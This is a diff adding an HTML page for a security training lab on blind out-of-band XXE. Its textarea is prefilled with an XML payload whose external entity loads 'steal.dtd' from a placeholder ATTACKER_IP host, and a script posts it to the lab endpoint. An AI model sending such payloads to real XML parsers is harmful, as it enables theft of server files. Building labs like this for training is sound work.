@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Lab 2 - Blind XXE OOB</title>
+</head>
+<body>
+    <h1>Lab 2: Blind XXE (Out-of-Band)</h1>
+
+    <p>
+        The application validates product ID as a number,  
+        but the XML parser is vulnerable.
+    </p>
+
+<textarea id="xmlInput" rows="14" cols="90">
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "http://ATTACKER_IP:8000/steal.dtd">
+]>
+<data>
+  <productId>101</productId>
+</data>
+</textarea>
+
+<br><br>
+<button onclick="sendXML()">Send XML</button>
+
+<pre id="output"
+     style="width: 800px; background:#111; color:#0f0; padding:10px;">
+</pre>
+
+<script>
+function sendXML() {
+    fetch("/blind_xml", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/xml"
+        },
+        body: document.getElementById("xmlInput").value
+    })
+    .then(res => res.json())
+    .then(data => {
+        document.getElementById("output").textContent =
+            JSON.stringify(data, null, 2);
+    })
+    .catch(err => {
+        document.getElementById("output").textContent = err;
+    });
+}
+</script>
+</body>
+</html>
